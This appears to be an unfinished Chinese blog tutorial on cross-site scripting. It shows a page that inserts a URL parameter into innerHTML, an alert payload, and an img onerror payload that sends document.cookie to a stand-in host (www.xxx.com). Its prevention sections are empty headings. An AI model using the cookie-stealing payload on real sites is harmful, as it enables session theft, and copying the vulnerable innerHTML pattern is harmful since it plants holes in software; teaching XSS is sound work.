---
layout: post
title: 前端安全指北：XSS攻击
date: 2019-05-10
categories: blog
header-color: "#678"
tags: [js]
---

### 今日说法

程序员杨天宝开发了一个页面，用于展示用户输入的数据：

[dev.cabeza.cn/security/xss.html?a=坤坤](http://dev.cabeza.cn/security/xss.html?a=坤坤)

看起来没什么问题 😀

某日，杨天宝接到了一串神秘网址:

<a href="http://dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22javascript:alert(%27NM$L%27)%22%3E">dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22javascript:alert(%27NM\$L%27)%22%3E</a>

点开后，页面弹出了写着粗鄙之语的弹出框

杨天宝又接到了一串神秘网址：

[dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22document.body.appendChild(document.createElement(%27img%27)).setAttribute(%27src%27%2C%27http%3A%2F%2Fwww.xxx.com%2Fcookie%3Fc%3D%27%2Bdocument.cookie)%3B%22%3E](<http://dev.cabeza.cn/security/xss.html?a=%3Cimg%20src=%22%22%20onerror=%22document.body.appendChild(document.createElement(%27img%27)).setAttribute(%27src%27%2C%27http%3A%2F%2Fwww.xxx.com%2Fcookie%3Fc%3D%27%2Bdocument.cookie)%3B%22%3E>)

`注：该页面已经提前埋下了值为'password=ikun'的测试性cookie`

这时如果你打开浏览器的控制台，就会发现已经朝http://www.xxx.com/cookie这个地址发送了请求，并且携带了自己的cookie

    http://www.xxx.com/cookie?c=password=ikun

想想攻击者拿到用户 cookie 意味着什么，杨天宝已经倒吸一口凉气了

### 案情分析

这是杨天宝开发的页面内容：

```html
<html lang="en">
  <head> </head>
  <body>
    <div id="test"></div>
    <h1>我喜欢唱跳rap还有篮球</h1>
  </body>
  <script>
    // 从url参数中取值
    let a = getQueryString("a");
    document.querySelector("#test").innerHTML = a;
  </script>
</html>
```

杨天宝过分信任用户的输入，没有做任何防范。

上面的例子中，黑客的攻击语句分别为

    <img src="" onerror="javascript:alert('NM$L')">

    <img src="" onerror="document.body.appendChild(document.createElement('img')).setAttribute('src','http://www.xxx.com/cookie?c='+document.cookie);">

当这些恶意语句没有经过过滤注入到页面 HTML 中时，其中的 js 代码便会执行，实现达到窃取用户信息的目的

**这就是 XSS 攻击**

### XSS 的定义

Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

为了不和层叠样式表（Cascading Style Sheets, CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS

### XSS 的分类

根据攻击手段的不同，xss 可以分为

- 存储型 XSS
- 反射型 XSS
- DOM 型 XSS

### XSS 的预防

### XSS 攻击案例

### 总结